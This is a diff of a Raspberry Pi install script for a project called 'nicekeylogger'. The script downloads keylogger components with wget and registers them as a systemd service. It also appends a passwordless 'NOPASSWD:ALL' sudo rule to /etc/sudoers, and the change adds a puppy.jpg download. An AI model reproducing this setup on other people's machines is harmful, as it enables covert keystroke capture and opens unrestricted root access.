@@ -14,7 +14,6 @@ echo "pi ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 !
 
 mkdir nicekl && cd nicekl/
-pwd
 
 # DOWNLOAD FILES if they are not already installed
 # nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
@@ -22,7 +21,8 @@ CONT=${base}controller.py
 KMAP=${base}keymap.py
 FKEY=${base}find_keyboard.py
 KLSERV=${base}nicekeylogger.service
-wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV"
+PUP=${base}puppy.jpg
+wget -L "$CONT" "$KMAP" "$FKEY" "$KLSERV" "$PUP"
 sudo chmod +x controller.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
